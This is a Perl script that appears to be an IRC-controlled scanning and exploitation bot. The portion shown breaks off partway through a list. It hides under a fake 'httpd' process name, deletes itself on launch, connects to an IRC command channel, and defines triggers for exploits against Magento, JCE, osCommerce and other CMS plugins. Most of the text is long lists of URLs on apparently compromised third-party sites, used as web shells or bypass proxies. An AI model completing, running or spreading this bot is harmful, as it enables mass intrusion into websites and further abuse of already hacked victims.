#!/usr/bin/perl

use HTTP::Request;
use HTTP::Request::Common;
use HTTP::Request::Common qw(POST);
use LWP::Simple;
use LWP 5.64;
use LWP::UserAgent;
use Socket;
use IO::Socket;
use IO::Socket::INET;
use IO::Select;
use MIME::Base64;
use URI::Escape;
use Digest::MD5 qw(md5_hex);


my $datetime    = localtime;
my $fakeproc  	= "/usr/sbin/httpd";
my $ircserver   = "irc.planetwork.co.id";
#my $ircserver   = "159.203.190.124"; 
#my $ircserver   = "siantar.byroe.org"; #20
my $ircport 	= "6667";
my $number 	= int(rand(100));
my $nickname 	= "Bobi".$number."";
my $ident     	= "id".$number."";
my $channel   	= "#DarkIT";
my $base	= "#calvin";
my $admin    	= "Hydra7";
my $fullname    = "2FUCK OFF!!";
my $nob0dy      = "15SexCrime";

my $searchlogo 	= "15(7@12Search15)";
#my $magelogo 	= "15(7@12Magento15)";
#my $jcelogo 	= "15(7@12Jce15)";
#my $actlogo 	= "15(7@12AP-Content15)";
#my $jdllogo 	= "15(7@12jDownLoads15)";
#my $foxlogo 	= "15(7@12fox_contact15)";
#my $flelogo 	= "15(7@12flexi_content15)";
#my $alplogo 	= "15(7@12AU-Points15)";
#my $horlogo 	= "15(7@12Hornot215)";
#my $jmulogo 	= "15(7@12JM-Media15)";
#my $oscologo 	= "15(7@12osCo15)";

my $shopliftcmd = "!mage".$number."";
my $jcecmd      = "!jce".$number."";
my $actcmd	= "!act".$number."";
my $jdlcmd	= "!jdl".$number."";
my $foxcmd	= "!fox".$number."";
my $flecmd	= "!fle".$number."";
my $jmucmd	= "!jmu".$number."";
my $alpcmd	= "!alp".$number."";
my $horcmd	= "!hor".$number."";
my $oscocmd     = "!osco".$number."";
my $phpcmd     = "!pt".$number."";
my $fabcmd     = "!fab".$number."";
my $osco_shell  = "bogel.jpg";
my $privscan    = 0;
my $shopliftxpl = "http://lime-media.info/magento/js/prototype/windows/themes/alert/modules/uploader.php";
my $jceid = "http://babagajah.com//car/backup.php";
sub randomagent {
my @array = ('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31');
my $random = $array[rand @array];
return($random);
}
my $useragent = randomagent();


my $ngilang    	= "rm -rf";
qx($ngilang $0);

my $uagent    = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6';

my $dom  	 		= $doms[rand(scalar(@doms))];



my @pgfa 			= ( "?q=https%3A%2F%2Fwww.google.com%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.de%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.co.uk%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.com.my%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.com.sg%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.ru%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.ro%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.de%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.ca%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.fr%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.co.id%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.ru%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.fr%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.de%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.com%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.com.my%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.com.br%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.com.br%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.co.uk%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.ne%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.co.mz%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.com.sg%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.com.mx%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.com.mx%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.de%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.ru%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.ro%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.co.id%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.at%2Fsearch?q=","?q=https%3A%2F%2Fwww.google.nl%2Fsearch?q="); 



##########################################################################################



my $pgfa  	 		= $pgfa[rand(scalar(@pgfa))];



##################################### By Passer ###########################################



my @randombarner  = ("http://quatrieme-internationale-posadiste.org/QIP//components/com_wrapper/errors.php",
"http://produkcja.rolnicy.com//components/com_wrapper/errors.php",
"http://dominicanway.com//components/com_alphacontent/assets/phpThumb/errors.php",
"http://www.economicswork.ru//plugins/editors/errors.php",
"http://lexiquedumanagement.com//components/com_alphacontent/assets/phpThumb/errors.php",
"http://www.psyzpalucha.pl//components/com_alphacontent/assets/phpThumb/errors.php",
"http://sellallmyideas.com/errors.php",
"http://www.artiste-peintre-figuratif.com/huile-aquarelle//components/com_alphacontent/assets/phpThumb/errors.php",
"http://www.glorybators.com/suarakebenaran//errors.php",
"http://www.distribucija.altpro.hr/edita/tinymce/jscripts/tiny_mce/plugins/imanager/scripts/phpThumb//errors.php",
"http://www.multichem-robust.com//components/com_wrapper/errors.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://zemnoe.ru/wp-includes/error.php",
"http://politics.cnm.com.pt/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://dailyfresh.nu/Hotfrog/errors.php",
"http://www.thai-orchidea.cz/modules/mod_login/error.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.ecomuseudelblat.cat/errors.php",
"http://transplant.org.kw/errors.php",
"http://dailyfresh.nu/Hotfrog/errors.php",
"http://interminas.ddns.net/errors.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.thermona-ekb.ru/errors.php",
"http://imotionasia.com.vn/errors.php",
"http://www.orfej.si/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://therfw.com/wp-includes/error.php",
"http://bigbananawatch.com/wp-content/themes/bigbananawatch/error.php",
"http://gobll.pl/errors.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.francescoantonelli.net/wp-content/themes/Widescreen/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://transplant.org.kw/errors.php",
"http://www.thai-orchidea.cz/modules/mod_login/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.mondragonlingua.com/formacion/components/com_users/search.php",
"http://exhibcouples.fr/errors.php",
"http://iheld.com/errors.php",
"http://www.kathleenferrari.com/errors.php",
"http://www.amslight.com/errors.php",
"http://pastorbonus.sk/errors.php",
"http://www.stlukeshometucson.org/errors.php",
"http://www.saboeiro.pt/errors.php",
"http://www.weisfeltlintz.nl/wordpress_1/tmp/search.php",
"http://hlmais.com.br/mundo/wp-content/themes/twentyten/error.php",
"http://treboliberica.com/includes/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://imotionasia.com.vn/errors.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://www.tcfa1.net/errors.php",
"http://dailyfresh.nu/errors.php",
"http://worldofphones.net/wp-content/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://zemnoe.ru/wp-includes/error.php",
"http://politics.cnm.com.pt/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://dailyfresh.nu/Hotfrog/errors.php",
"http://www.thai-orchidea.cz/modules/mod_login/error.php"
);

my @random1  = ("www.beslistfietsen.nl/errors.php",
"citizenofburma.org//plugins/content/errors.php",
"http://choir.louwanjpoujezi.org//plugins/content/errors.php",
"http://gdthuyphuong.free.fr//includes/errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://zamzamsweets.in/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://www.dvdmall.us/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://www.rotarymowers.com.au/errors.php",
"http://printi.be/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://orcastudio.co/blog/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb///error.php",
"http://www.decorvega.es/bypass.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://re-bel.org//bypass.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://friendsofradstockrailwayland.org/upload/bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://techno.pk/skin/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://kenthecomicman.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"http://sumaho-print.net//bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://laptopcity.co.nz/bypass.php",
"http://www.studiofifteen.in/errors.php",
"http://daddivamoda.com.br/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://www.kittfoundation.org//wp-includes/js/plupload/index.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.travelpointer.ro//wp-includes/js/plupload/index.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.orfej.si/components/com_mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.dileeponline.com/errors.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://vdfs.ru//plugins/editors/error.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.ele-eme.com.mx/error.php",
"http://virtualmacompetition.com//error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://deangelisviaggi.it//wp-admin/network/error.php",
"http://www.elado.ro//xmlrpc/error.php",
"http://www.oem-dealer-parts.ca//components/com_media/error.php",
"http://blog.eurostargym.com/wp-includes/js/thickbox/class-mail.php",
"http://shop.stroiportal.kz/cgi-bin/error.php",
"http://www.mecanica.ufrj.br/ufrj-em//components/error.php",
"http://www.t1site.com.br/wp-admin/error.php",
"http://quadrabrain.com//wp-admin/error.php",
"http://milesnation.com/whitney/css/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.ehbo-eelde.nl/media/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.alexgretter.com/google.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.thewigmall.com/errors.php",
"http://www.solucionesparati.net/CMS2008/images/error.php",
"http://www.allcam.org/errors.php",
"http://totalfish.hu/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.theatresprives.com/errors.php",
"http://wesotech.com/contact/google.php",
"http://moreketing.mx/errors.php",
"http://sufbellman.dk/media/error.php",
"http://www.mariobabiera.com/google.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://pastorbonus.sk/errors.php",
"http://test.stramed.com.tr/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.psdf.org.pk/errors.php",
"http://iheld.com/errors.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.musetti.eu/errors.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.lincos.si/components/com_banners/models/error.php",
"http://eventos.unisangil.edu.co/media/media/css/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://lisarkent.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://blizzsozz.com/errors.php",
"http://www.conradel.com/errors.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://kavkazinterpress.ru/plugins/content/config.inc.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://www.pkstorages.com//plugins/content/seka.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://themansphere.com/wp-includes/error.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://www.thermona-ekb.ru/errors.php", 
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://islamone.org/flash/errors.php",
"http://pnpdistribuidora.com.br//erros/errors.php",
"http://ancoimbra.net//media/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.thomastyreperu.com//plugins/errors.php",
"http://soosh-lb.com//errors.php",
"http://eshopbmw.com//skin/adminhtml/default/error.php",
"http://www.mecanica.coppe.ufrj.br/ufrj-em//components/com_media/error.php",
"http://www.iwhatswatch.com//skin/frontend/default/default/images/error.php",
"http://www.imc-egypt.org//cli/error.php",
"http://www.thermona-ekb.ru/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.angola-embassy.nl/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://arpwegenwaterbouw.nl/wp-content/themes/smartbox-theme/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://pnpdistribuidora.com.br//errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"http://www.starcom1.eu/skin/adminhtml/error.php",
"http://zlotohiszpanii.pl/skin/adminhtml/error.php",
"http://king-solarman.com/skin/adminhtml/base/error.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.karpet.cz/media/system/js/jquery.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://themansphere.com/wp-includes/error.php",
"http://www.cloudipalarm.nl/wp-content/plugins/revslider/temp/errors.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.thewigmall.com/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://www.addisyouth.org.et/components/com_mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://www.tcfa1.net/errors.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://www.deltadunariilive.ro/wp-content/errors.php",
"http://fisioleste.com.br/wp-admin/errors.php",
"http://resources.opth1jobs.com//modules/errors.php",
"http://www.propertydd4u.com//errors.php",
"http://www.skipperdean.com//media/errors.php",
"http://www.baskingshark.ie//media/errors.php",
"http://flirtbogota.co/web3//media/errors.php",
"http://gaysm.pl/media/errors.php",
"http://www.baliste-club.org//media/errors.php",
"http://tbilisi-portal.com//tmp/errors.php",
"http://store.setar.aw/errors.php",
"http://www.pokal-royal.de//js/errors.php",
"http://www.fiesta-del-sol.fr//errors.php",
"http://ethnikometopo.gr//tmp/errors.php",
"http://newlifebiblechurch.org//media/errors.php",
"http://www.cjbg.ma/errors.php",
"http://donghohanghieu.diemnhan.net//errors.php",
"http://inovatyonconsorcio.com.br/errors.php",
"http://www.toprace.co.uk/errors.php",
"http://pretty-talk.com//js/lib/errors.php",
"http://ifeed.co.kr//errors.php",
"http://abcofficemoveis.com.br/novo/media/errors.php",
"http://www.gramophoneshop.nl/webshop//skin/frontend/default/errors.php",
"http://prweb.com.sg/maimee/errors.php",
"http://bkd.bimakota.go.id//wp-admin/css/colors/blue/errors.php",
"http://www.siambeautyonline.com//errors.php",
"http://www.supon.tech//skin/adminhtml/default/default/images/moneybookers/errors.php",
"http://www.icomplementi.com/picture_library/errors.php",
"http://gaysm.pl/flash/modules/global/js/errors.php",
"http://www.chrontel.com/skin/adminhtml/default/default/lib/prototype/windows/themes/magento/.../errors.php",
"http://www.internetrights.in/wp-content/plugins/contact-form-7/images/service-icons/errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://mrsteamers.com//wp-content/plugins/errors.php",
"http://onlineordering.alumaxshowerdoor.com/skin/frontend/errors.php",
"http://www.chispazorumbas.com//plugins/errors.php",
"http://projects.kurinjiemedia.com/singlemovie//wp-content/plugins/errors.php",
"http://pasionporlajusticia.com/2015//wp-content/plugins/errors.php",
"http://www.younik.co/skin/frontend/errors.php",
"http://www.fedir.it//components/com_mailto/views/mailto/errors.php",
"http://www.copati.org.br//images/jdownloads/screenshots/thumbnails/errors.php",
"http://tuva-church.com/slovo//wp-content/plugins/dzs-videogallery/errors.php",
"http://morada.com.ve/newsite//wp-content/plugins/dzs-videogallery/errors.php",
"http://cmtactical.com//skin/install/default/default/errors.php",
"http://oldfashionedman.com//errors.php",
"http://ajansfestival.com/wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://tricotrico.com/wp-includes/error.php",
"http://www.shg-vaskulitis-eifel-mosel.de//forum/style/portal/error.php",
"http://nutritie-wellness.ro/var/package/tmp/error.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://themansphere.com/wp-includes/error.php",
"https://www.cloudipalarm.nl/wp-content/plugins/revslider/temp/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://www.lupetticonsultoria.com.br//kellylupetti/errors.php",
"http://redzee.com.au/friends/errors.php",
"http://watchmanreports.com/errors.php",
"http://www.chispazorumbas.com//hwdvideos/errors.php",
"http://islamone.org/errors.php",
"http://hoopsnhiphop.com/errors.php",
"http://www.brasilecon.net/skin/errors.php",
"http://redzee.com.au/friends/inc/classes/errors.php",
"http://shoppershopee.com/errors.php",
"http://xoxofimp.com//errors.php",
"http://islamone.org/flash/errors.php",
"http://www.lmcreativedesign.com.br/wp-content/plugins/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.thermona-ekb.ru/errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://www.jhanjhatfree.com//skin/frontend/base/errors.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://therfw.com/wp-includes/error.php",
"http://representacoesdasa.com.br/wp-admin/errors.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.telsonet.pl/errors.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://pastorbonus.sk/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://www.imakecollege.com:37001//plugins/editors/errors.php",
"http://imotionasia.com.vn/errors.php",
"http://www.theatresprives.com/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://moreketing.mx/errors.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.psdf.org.pk/errors.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://circuitec.com.br/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.musetti.eu/errors.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.thewigmall.com/errors.php",
"https://www.aavamobile.com/modules/mod_search/index.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.cannell-immobilier.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://sufbellman.dk//errors.php",
"http://printfastt.com.br/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://blizzsozz.com/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://www.mirabalcenter.org//errors.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://hoponhopoff.ge//errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://zamzamsweets.in/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://www.dvdmall.us/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://www.rotarymowers.com.au/errors.php",
"http://printi.be/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
